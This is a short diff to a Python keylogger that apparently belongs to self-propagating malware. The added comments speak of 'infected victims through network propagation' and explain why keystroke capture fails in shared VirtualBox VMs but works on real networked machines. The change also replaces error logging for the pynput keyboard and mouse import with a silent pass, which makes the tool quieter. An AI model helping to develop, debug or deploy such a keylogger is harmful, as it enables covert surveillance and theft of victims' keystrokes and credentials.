@@ -3,10 +3,11 @@
 ###########################################################################################################################
 
 import os
+# Keylogger will fail with infected victims through network propagation
+# This happens because no keyboard and mouse are detected when using multiple VM in VirtualBox
+# It should work on a network where each computer has its own peripherals and do not share them
 try: from pynput import keyboard, mouse
-except Exception as e: 
-    with open('error_log.txt', 'a') as file:
-        file.write(f"Import ERROR 'from pynput import keyboard, mouse': {e}")
+except Exception as e: pass
 from ewmh import EWMH
 
 ###########################################################################################################################
